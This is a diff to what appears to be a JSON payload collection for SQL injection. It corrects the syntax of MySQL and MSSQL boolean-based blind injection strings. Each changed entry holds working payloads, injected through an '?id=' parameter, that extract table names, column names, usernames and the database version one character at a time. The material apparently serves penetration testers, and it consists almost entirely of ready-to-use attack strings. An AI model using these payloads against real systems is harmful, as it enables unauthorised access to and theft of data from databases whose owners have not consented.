@@ -372,7 +372,7 @@
       "title": "MySQL blind — SUBSTRING / ASCII",
       "language": "sql",
       "tags": ["blind", "mysql", "boolean-based"],
-      "body": "?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'\n?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'\n?id=1 AND ASCII(LOWER(SUBSTR(version(),1,1)))=51"
+      "body": "?id=1 AND (SELECT SUBSTR(table_name,1,1) FROM information_schema.tables LIMIT 1) > 'A'\n?id=1 AND (SELECT SUBSTR(column_name,1,1) FROM information_schema.columns LIMIT 1) > 'A'\n?id=1 AND ASCII(LOWER(SUBSTR(version(),1,1)))=51"
     },
     {
       "subcategory": "Blind / Boolean-based",
@@ -423,7 +423,7 @@
       "title": "MSSQL blind — substring",
       "language": "sql",
       "tags": ["blind", "mssql"],
-      "body": "AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -\nAND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97\nAND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64-- \nAND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90"
+      "body": "AND LEN((SELECT TOP 1 username FROM tblusers))=5 ; -- -\nAND ASCII(SUBSTRING((SELECT TOP 1 username FROM tblusers),1,1))=97\nAND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64-- \nAND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90"
     },
     {
       "subcategory": "Blind / Boolean-based",
